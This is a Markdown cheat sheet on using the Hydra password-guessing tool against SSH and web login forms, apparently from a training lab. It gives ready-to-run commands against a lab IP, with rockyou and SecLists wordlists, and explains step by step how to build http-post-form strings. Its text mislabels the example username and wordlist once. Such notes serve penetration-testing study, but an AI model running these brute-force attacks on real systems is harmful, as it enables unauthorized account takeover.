
Hydra has the ability to brute force the following protocols: **FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, MYSQL, POSTGRES, RDP, SIP, SMB, SMTP, SMTP Enum etc...**
# Hydra Commands – Quick Summary

Hydra is a brute-force tool that attacks login services (SSH, FTP, web forms, etc.) using usernames and password lists.  

The command syntax changes depending on the protocol/service.
## General Syntax
```bash
hydra [options] <target> <service>
```

# 1. SSH Brute-Force Example

```bash
hydra -l molly -P rockyou.txt 10.114.143.65 ssh -vV -t 4 -I -s <port_number>
# -vV  : verbose
# -I   : Skip restoring file
# -t 4 : Reduce the tasks
# -s   : port number
```

**Flags explained**:
- `-l <username>` → single username (e.g., root, admin)
- `-P <wordlist>` → path to password list file
- `-t 4` → number of parallel threads (4 = moderate speed, avoids lockouts)
- `ssh` → target service (SSH in this case)

**What it does**:
- Tries username `root`
- Tests every password from `passwords.txt`
- Runs 4 attempts at the same time

# 2. Web Form (POST) Brute-Force Example
```bash
hydra -l admin -P rockyou.txt 10.114.143.65 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Flags explained**:
- `-l <username>` → single username to test
- `-P <wordlist>` → password list file
- `http-post-form` → module for POST-based web login forms
- `"<path>:<login_credentials>:<invalid_response>"` → the important part (see below)
  - `<path>` → login page URL (e.g. `/`, `/login.php`, `/admin/index.php`)
  - `<login_credentials>` → the POST data fields with placeholders
  - `<invalid_response>` → string that appears on failed login (e.g., `F=incorrect`, `Login failed`, `Invalid credentials`)
- `-V` → verbose output (shows every attempt)

### **Examples from real forms**:

#### 1. **If the HTML looks like this**:

```  html
<input name="user" type="text">
<input name="pass" type="password">
```

→ You **must** use:

``` shell
user=^USER^&pass=^PASS^    
```

**What it does**:
- Sends POST requests to the login page
- Replaces `^USER^` with the username (from `-l`)
- Replaces `^PASS^` with each password from the wordlist
- If the response **contains** the failure string (`F=incorrect`), Hydra marks it as wrong and continues
### Other example : 
```sh
hydra -l admin
      -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
      10.114.143.65 http-post-form \
      "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." \
      -V
```
#### 2. **What about the <invalid_response> ?**

Hydra searches the entire response body (the full HTML/text returned by the server after submitting the form) for the exact string you specified after the last colon (e.g., F=incorrect, Invalid credentials, Login failed, etc.).

---
>[!IMPORTANT]
>  **the submit=Login part is often needed, and it's **not** an error indicator.**

### What submit=Login means

Many login forms include a **hidden or visible submit button** with a name/value pair sent in the POST data.

Example real HTML from a form:

```html
<input type="text" name="username">
<input type="password" name="password">
<input type="submit" name=submit value="Login"> #The name is the important one
```

When you click "Login", the browser sends:

```txt
username=admin&password=123&submit=Login
```

Hydra must **exactly replicate** what the browser sends, so you **include** the submit field:

```txt
username=^USER^&password=^PASS^&submit=Login
```

- If you **omit** <u>submit=Login</u>, the server might:
    - Reject the request (no submit button pressed)
    - Return a different page/error
    - Or even treat it as success/failure incorrectly

So **yes, add it** if it's present in the real POST request (check Network tab in browser dev tools).

### Where does the "error" go then?

The **error/failure indicator** goes **after the last colon :**, **not** inside the POST data.

<u>Correct full format</u>:

```sh
"<path>:<full POST data with ^USER^ ^PASS^ and submit>:<failure string>"
```

<u>Examples</u>:

1. With submit button:
  ```sh
  "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid credentials"
  ```
  
2. Without submit (if form doesn't send it):
```sh
"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

